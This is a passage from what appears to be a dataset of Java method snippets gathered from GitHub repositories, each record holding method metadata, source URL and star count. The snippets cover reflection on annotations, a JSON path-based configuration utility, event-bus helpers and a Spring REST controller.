System.out.println(temp);\n            }\n\n        }\n\n        System.out.println(\"\\n\");\n        { // \u83b7\u53d6myMessageImpl\u5b50\u7c7b\u4e0a\u7684Annotation\n            Annotation annotations[] = myMessageImpl.class.getAnnotations();\n            for(Annotation temp:annotations){\n                System.out.println(temp);\n            }\n        }\n\n        System.out.println(\"\\n\");\n        { // \u83b7\u53d6myMessageImpl.send\u65b9\u6cd5\u4e0a\u7684Annotation\n            Method method = myMessageImpl.class.getDeclaredMethod(\"send\",String.class);\n            Annotation annotations[] = method.getDeclaredAnnotations();\n            for(Annotation temp:annotations){\n                System.out.println(temp);\n            }\n        }\n\n        Method method1 = test.class.getMethod(\"send\", String.class); //\u83b7\u53d6\u6307\u5b9a\u65b9\u6cd5\n        myAnnotation anno = method1.getAnnotation(myAnnotation.class); //\u83b7\u53d6\u6307\u5b9aannotation\n        System.out.println(anno.title());\n        System.out.println(anno.url());\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/javaSenior/reflectStudy/reflectAnnotation.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58269, "method_name": "send", "class_name": "myMessageImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void send(String msg) {\n        System.out.println(\"\u6d88\u606f\u53d1\u9001:\"+msg);\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/javaSenior/reflectStudy/reflectAnnotation.java", "stars": "10", "class_props": {"extends": null, "implements": ["myMessage", "Serializable"], "modifiers": []}}, {"id": 58270, "method_name": "send", "class_name": "test", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void send(String msg){\n        System.out.println(\"\u6d88\u606f\u53d1\u9001\uff1a\"+msg);\n    }", "url": "https://raw.githubusercontent.com/hzc869046779/JAVA-STUDY/master/src/javaSenior/reflectStudy/reflectAnnotation.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 58271, "method_name": "getUser", "class_name": "UserTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getUser()\n\t{\n\t\treturn user;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/UserTime.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58272, "method_name": "setUser", "class_name": "UserTime", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setUser( String user )\n\t{\n\t\tthis.user = user;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/UserTime.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58273, "method_name": "getTime", "class_name": "UserTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getTime()\n\t{\n\t\treturn time;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/UserTime.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58274, "method_name": "setTime", "class_name": "UserTime", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setTime( Date time )\n\t{\n\t\tthis.time = time;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/model/UserTime.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58275, "method_name": "from", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "TaskConfiguration", "snippet": "    public static TaskConfiguration from(String json){\n        json = PatternInjectUtils.inject(json, new String[]{});\n        return new TaskConfiguration(json);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58276, "method_name": "searchKeyToInsertValue", "class_name": "TaskConfiguration", "params": ["TaskConfiguration", "String", "String", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean searchKeyToInsertValue(TaskConfiguration configuration, String path,\n                                                 String key, Object value){\n        TaskConfiguration subConf = configuration.getConfiguration(path);\n        Set<String> keys = subConf.getKeys();\n        //search key\n        for(String key0 : keys){\n            if(key0.endsWith(SPLIT_CHAR + key)){\n                configuration.set(StringUtils.join(new String[]{path, key0}, SPLIT_CHAR), value);\n                return true;\n            }\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58277, "method_name": "searchKeyPaths", "class_name": "TaskConfiguration", "params": ["TaskConfiguration", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<String>", "snippet": "    public static List<String> searchKeyPaths(TaskConfiguration configuration, String path,\n                                         String key){\n        List<String> result = new ArrayList<>();\n        TaskConfiguration subConf = configuration.getConfiguration(path);\n        Set<String> keys = subConf.getKeys();\n        keys.forEach(key0 -> {\n            if(key0.equals(key) || key0.endsWith(SPLIT_CHAR + key)){\n                result.add(key0);\n            }\n        });\n        return result;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58278, "method_name": "toJson", "class_name": "TaskConfiguration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toJson(){\n        return Json.toJson(root, null);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58279, "method_name": "set", "class_name": "TaskConfiguration", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object set(final String path, final Object object) {\n        if(!checkPath(path)){\n            return null;\n        }\n        Object result = this.get(path);\n        setObject(path, extract(object));\n        return result;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58280, "method_name": "get", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object get(final String path){\n        this.checkPath(path);\n        return this.findObject(path);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58281, "method_name": "getString", "class_name": "TaskConfiguration", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getString(final String path, String defaultValue){\n        Object result = this.get(path);\n        if(null == result){\n            return defaultValue;\n        }\n        if(result instanceof String){\n            return (String)result;\n        }else if(result.getClass().isPrimitive() || isWrapClass(result.getClass())){\n            return String.valueOf(result);\n        }else{\n            return Json.toJson(result, null);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58282, "method_name": "getInt", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getInt(final String path){\n        String result = this.getString(path);\n        if(null == result){\n            return null;\n        }\n        return Integer.valueOf(result);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58283, "method_name": "getString", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getString(final String path){\n        return getString(path, null);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58284, "method_name": "getKeys", "class_name": "TaskConfiguration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "    public Set<String> getKeys(){\n        return getKeys(Integer.MAX_VALUE);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58285, "method_name": "getKeys", "class_name": "TaskConfiguration", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "    public Set<String> getKeys(int maxDepth){\n        Set<String> collect = new HashSet<>();\n        this.getKeysRecursive(this.root, \"\", collect, maxDepth);\n        return collect;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58286, "method_name": "getConfiguration", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "TaskConfiguration", "snippet": "    public TaskConfiguration getConfiguration(final String path){\n        Object object = this.get(path);\n        if(null == object){\n            return null;\n        }\n        return TaskConfiguration.from(Json.toJson(object, null));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58287, "method_name": "findObject", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object findObject(final String path){\n        if(StringUtils.isBlank(path)){\n            return this.root;\n        }\n        Object target = this.root;\n        for(final String each : split2List(path)){\n            if(isPathMap(each) && target instanceof Map){\n                target = ((Map<String, Object>)target).get(each);\n            }else if (isPathList(each) && target instanceof List){\n                String index = each.replace(\"[\", \"\").replace(\"]\", \"\");\n                if(!StringUtils.isNumeric(index)){\n                    throw new IllegalArgumentException(\"index value must be numeric, value: \" + index);\n                }\n                target = ((List<Object>)target).get(Integer.valueOf(index));\n            }else{\n                target = null;\n                break;\n            }\n        }\n        return target;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58288, "method_name": "setObject", "class_name": "TaskConfiguration", "params": ["String", "Object"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setObject(final String path, final Object object){\n        Object newRoot = setObjectRecursive(this.root, split2List(path), 0, object);\n        boolean isSuit = null != newRoot && (newRoot instanceof List || object instanceof Map);\n        if(isSuit){\n            this.root = newRoot;\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58289, "method_name": "setObjectRecursive", "class_name": "TaskConfiguration", "params": ["Object", "List<String>", "int", "Object"], "throws": null, "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object setObjectRecursive(Object current, final List<String> paths,\n                                      int index, final Object value){\n        if(index >= paths.size()){\n            return value;\n        }\n        String path = paths.get(index).trim();\n        if(isPathMap(path)){\n            //current object is not map\n            Map<String, Object> mapping;\n            if(!(current instanceof Map)){\n                mapping = new HashMap<>(1);\n                mapping.put(path, buildObject(paths.subList(index + 1, paths.size()), value));\n                return mapping;\n            }\n            mapping = (Map<String, Object>)current;\n            //current map does not have key\n            if(!mapping.containsKey(path)){\n                mapping.put(path, buildObject(paths.subList(index + 1, paths.size()), value));\n                return mapping;\n            }\n            mapping.put(path, setObjectRecursive(mapping.get(path),\n                    paths, index + 1, value));\n            return mapping;\n        }\n        if(isPathList(path)){\n            List<Object> lists;\n            int listIndex = getIndex(path);\n            //current object is not list\n            if(!(current instanceof List)){\n               lists = expand(new ArrayList<>(listIndex + 1), listIndex + 1);\n               lists.set(listIndex, buildObject(paths.subList(index + 1, paths.size()), value));\n               return lists;\n            }\n            lists = (List<Object>) current;\n            lists = expand(lists, listIndex + 1);\n            //current list does not have the index\n            if(null == lists.get(listIndex)){\n                lists.set(listIndex, buildObject(paths.subList(index + 1, paths.size()), value));\n                return lists;\n            }\n            lists.set(listIndex, setObjectRecursive(lists.get(listIndex),\n                    paths, index + 1, value));\n            return lists;\n        }\n        throw new RuntimeException(\"system error\");\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58290, "method_name": "buildObject", "class_name": "TaskConfiguration", "params": ["List<String>", "Object"], "throws": null, "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object buildObject(final List<String> paths, final Object object){\n        if(null == paths ){\n            throw new IllegalArgumentException(\"paths cannot be null\");\n        }\n        if(1 == paths.size() && StringUtils.isBlank(paths.get(0))){\n            return object;\n        }\n        Object child = object;\n        for(int i = paths.size() - 1; i >= 0; i--){\n            String path = paths.get(i);\n            if(isPathMap(path)){\n                Map<String, Object> mapping = new HashMap<>(1);\n                mapping.put(path, child);\n                child = mapping;\n                continue;\n            }\n            if(isPathList(path)){\n                int index = getIndex(path);\n                List<Object> lists = new ArrayList<>(index + 1);\n                expand(lists, index + 1);\n                lists.set(index, child);\n                child = lists;\n                continue;\n            }\n            throw new IllegalArgumentException(\"illegal path\");\n        }\n        return child;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58291, "method_name": "extract", "class_name": "TaskConfiguration", "params": ["Object"], "throws": null, "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object extract(final Object object){\n        if(object instanceof TaskConfiguration){\n            return ((TaskConfiguration)object).root;\n        }\n        if(object instanceof List){\n            List<Object> result = new ArrayList<>();\n            for(final Object each : (List)object){\n                result.add(extract(each));\n            }\n            return result;\n        }\n        if(object instanceof Map){\n            Map map = (Map)object;\n            Map<String, Object> result = new HashMap<>(map.size());\n            for(final Object key : map.keySet()){\n                result.put(String.valueOf(key), extract(map.get(key)));\n            }\n            return result;\n        }\n        return object;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58292, "method_name": "isPathList", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isPathList(final String path){\n        return path.contains(\"[\") && path.contains(\"]\");\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58293, "method_name": "isPathMap", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isPathMap(final String path){\n        return StringUtils.isNotBlank(path) && !isPathList(path);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58294, "method_name": "split2List", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "List<String>", "snippet": "    private List<String> split2List(final String path){\n        return Arrays.asList(StringUtils.split(path.replace(\"[\", \".[\"), \".\"));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58295, "method_name": "getIndex", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int getIndex(final String index) {\n        return Integer.valueOf(index.replace(\"[\", \"\").replace(\"]\", \"\"));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58296, "method_name": "checkPath", "class_name": "TaskConfiguration", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean checkPath(final String path){\n        if(null == path){\n            return false;\n        }\n        for(String each : StringUtils.split(SPLIT_CHAR)){\n            if(StringUtils.containsWhitespace(each)){\n                throw new IllegalArgumentException(\"cannot contains white space in : \" + path);\n            }\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58297, "method_name": "expand", "class_name": "TaskConfiguration", "params": ["List<Object>", "int"], "throws": null, "modifiers": ["private"], "return_type": "List<Object>", "snippet": "    private List<Object> expand(List<Object> list, int size) {\n        int expand = size - list.size();\n        while (expand-- > 0) {\n            list.add(null);\n        }\n        return list;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58298, "method_name": "getKeysRecursive", "class_name": "TaskConfiguration", "params": ["Object", "String", "Set<String>", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void getKeysRecursive(final Object current, String path, Set<String> collect,int depth){\n        if(depth-- <= 0){\n            collect.add(path);\n            return;\n        }\n        if(current instanceof Map){\n            Map mapping = (Map)current;\n            for(final Object key : mapping.keySet()){\n                String keyStr = String.valueOf(key).trim();\n                if(StringUtils.isBlank(path)){\n                    getKeysRecursive(mapping.get(key), keyStr, collect, depth);\n                }else{\n                    getKeysRecursive(mapping.get(key), path + SPLIT_CHAR + keyStr, collect, depth);\n                }\n            }\n        }else if(current instanceof List){\n            List lists = (List) current;\n            for(int i = 0; i < lists.size(); i++){\n                getKeysRecursive(lists.get(i), path + String.format(\"[%d]\", i), collect, depth);\n            }\n        }else{\n            collect.add(path);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58299, "method_name": "isWrapClass", "class_name": "TaskConfiguration", "params": ["Class"], "throws": null, "modifiers": ["static", "private"], "return_type": "boolean", "snippet": "    private static boolean isWrapClass(Class clz){\n        try{\n            return ((Class)clz.getField(\"TYPE\").get(null)).isPrimitive();\n        }catch(Exception e){\n            return false;\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/core/src/main/java/com/webank/wedatasphere/exchangis/executor/util/TaskConfiguration.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58300, "method_name": "getSubscriberClass", "class_name": "AbstractSubscriberInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Class", "snippet": "    public Class getSubscriberClass() {\n        return subscriberClass;\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/meta/AbstractSubscriberInfo.java", "stars": "7", "class_props": {"extends": null, "implements": ["SubscriberInfo"], "modifiers": ["public", "abstract"]}}, {"id": 58301, "method_name": "getSuperSubscriberInfo", "class_name": "AbstractSubscriberInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SubscriberInfo", "snippet": "    public SubscriberInfo getSuperSubscriberInfo() {\n        if(superSubscriberInfoClass == null) {\n            return null;\n        }\n        try {\n            return superSubscriberInfoClass.newInstance();\n        } catch (InstantiationException e) {\n            throw new RuntimeException(e);\n        } catch (IllegalAccessException e) {\n            throw new RuntimeException(e);\n        }\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/meta/AbstractSubscriberInfo.java", "stars": "7", "class_props": {"extends": null, "implements": ["SubscriberInfo"], "modifiers": ["public", "abstract"]}}, {"id": 58302, "method_name": "shouldCheckSuperclass", "class_name": "AbstractSubscriberInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean shouldCheckSuperclass() {\n        return shouldCheckSuperclass;\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/meta/AbstractSubscriberInfo.java", "stars": "7", "class_props": {"extends": null, "implements": ["SubscriberInfo"], "modifiers": ["public", "abstract"]}}, {"id": 58303, "method_name": "createSubscriberMethod", "class_name": "AbstractSubscriberInfo", "params": ["String", "Class<?>"], "throws": null, "modifiers": ["protected"], "return_type": "SubscriberMethod", "snippet": "    protected SubscriberMethod createSubscriberMethod(String methodName, Class<?> eventType) {\n        return createSubscriberMethod(methodName, eventType, ThreadMode.POSTING, 0, false);\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/meta/AbstractSubscriberInfo.java", "stars": "7", "class_props": {"extends": null, "implements": ["SubscriberInfo"], "modifiers": ["public", "abstract"]}}, {"id": 58304, "method_name": "createSubscriberMethod", "class_name": "AbstractSubscriberInfo", "params": ["String", "Class<?>", "ThreadMode"], "throws": null, "modifiers": ["protected"], "return_type": "SubscriberMethod", "snippet": "    protected SubscriberMethod createSubscriberMethod(String methodName, Class<?> eventType, ThreadMode threadMode) {\n        return createSubscriberMethod(methodName, eventType, threadMode, 0, false);\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/meta/AbstractSubscriberInfo.java", "stars": "7", "class_props": {"extends": null, "implements": ["SubscriberInfo"], "modifiers": ["public", "abstract"]}}, {"id": 58305, "method_name": "createSubscriberMethod", "class_name": "AbstractSubscriberInfo", "params": ["String", "Class<?>", "ThreadMode", "int", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "SubscriberMethod", "snippet": "    protected SubscriberMethod createSubscriberMethod(String methodName, Class<?> eventType, ThreadMode threadMode,\n                                                      int priority, boolean sticky) {\n        try {\n            Method method = subscriberClass.getDeclaredMethod(methodName, eventType);\n            return new SubscriberMethod(method, eventType, threadMode, priority, sticky);\n        } catch (NoSuchMethodException e) {\n            throw new EventBusException(\"Could not find subscriber method in \" + subscriberClass +\n                    \". Maybe a missing ProGuard rule?\", e);\n        }\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/meta/AbstractSubscriberInfo.java", "stars": "7", "class_props": {"extends": null, "implements": ["SubscriberInfo"], "modifiers": ["public", "abstract"]}}, {"id": 58306, "method_name": "findAll", "class_name": "ChannelController", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Result", "snippet": "\tpublic Result findAll(){\n\t\treturn new Result(true,StatusCode.OK,\"\u67e5\u8be2\u6210\u529f\",channelService.findAll());\n\t}", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_article/src/main/java/com/tensquare/article/controller/ChannelController.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58307, "method_name": "findById", "class_name": "ChannelController", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Result", "snippet": "\tpublic Result findById(@PathVariable String id){\n\t\treturn new Result(true,StatusCode.OK,\"\u67e5\u8be2\u6210\u529f\",channelService.findById(id));\n\t}", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_article/src/main/java/com/tensquare/article/controller/ChannelController.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58308, "method_name": "findSearch", "class_name": "ChannelController", "params": ["Map", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "Result", "snippet": "\tpublic Result findSearch(@RequestBody Map searchMap , @PathVariable int page, @PathVariable int size){\n\t\tPage<Channel> pageList = channelService.findSearch(searchMap, page, size);\n\t\treturn  new Result(true,StatusCode.OK,\"\u67e5\u8be2\u6210\u529f\",  new PageResult<Channel>(pageList.getTotalElements(), pageList.getContent()) );\n\t}", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_article/src/main/java/com/tensquare/article/controller/ChannelController.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58309, "method_name": "findSearch", "class_name": "ChannelController", "params": ["Map"], "throws": null, "modifiers": ["public"], "return_type": "Result", "snippet": "    public Result findSearch( @RequestBody Map searchMap){\n        return new Result(true,StatusCode.OK,\"\u67e5\u8be2\u6210\u529f\",channelService.findSearch(searchMap));\n    }", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_article/src/main/java/com/tensquare/article/controller/ChannelController.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58310, "method_name": "add", "class_name": "ChannelController", "params": ["Channel"], "throws": null, "modifiers": ["public"], "return_type": "Result", "snippet": "\tpublic Result add(@RequestBody Channel channel  ){\n\t\tchannelService.add(channel);\n\t\treturn new Result(true,StatusCode.OK,\"\u589e\u52a0\u6210\u529f\");\n\t}", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_article/src/main/java/com/tensquare/article/controller/ChannelController.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58311, "method_name": "update", "class_name": "ChannelController", "params": ["Channel", "String"], "throws": null, "modifiers": ["public"], "return_type": "Result", "snippet": "\tpublic Result update(@RequestBody Channel channel, @PathVariable String id ){\n\t\tchannel.setId(id);\n\t\tchannelService.update(channel);\t\t\n\t\treturn new Result(true,StatusCode.OK,\"\u4fee\u6539\u6210\u529f\");\n\t}", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_article/src/main/java/com/tensquare/article/controller/ChannelController.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58312, "method_name": "delete", "class_name": "ChannelController", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Result", "snippet": "\tpublic Result delete(@PathVariable String id ){\n\t\tchannelService.deleteById(id);\n\t\treturn new Result(true,StatusCode.OK,\"\u5220\u9664\u6210\u529f\");\n\t}", "url": "https://raw.githubusercontent.com/1127140426/tensquare/master/tensquare_article/src/main/java/com/tensquare/article/controller/ChannelController.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58313, "method_name": "hasWrapperFor", "class_name": "CustomBeanWrapperFactory", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean hasWrapperFor(Object object) {\n    if (object instanceof Author) {\n      return true;\n    } else {\n      return false;\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/misc/CustomBeanWrapperFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectWrapperFactory"], "modifiers": ["public"]}}, {"id": 58314, "method_name": "getWrapperFor", "class_name": "CustomBeanWrapperFactory", "params": ["MetaObject", "Object"], "throws": null, "modifiers": ["public"], "return_type": "ObjectWrapper", "snippet": "  public ObjectWrapper getWrapperFor(MetaObject metaObject, Object object) {\n    return new CustomBeanWrapper(metaObject, object);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/domain/misc/CustomBeanWrapperFactory.java", "stars": "15", "class_props": {"extends": null, "implements": ["ObjectWrapperFactory"], "modifiers": ["public"]}}, {"id": 58315, "method_name": "initElements", "class_name": "PottedYellowAmaranthBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items.add(() -> new BlockItem(block, new Item.Properties().group(null)).setRegistryName(block.getRegistryName()));\n\t}", "url": 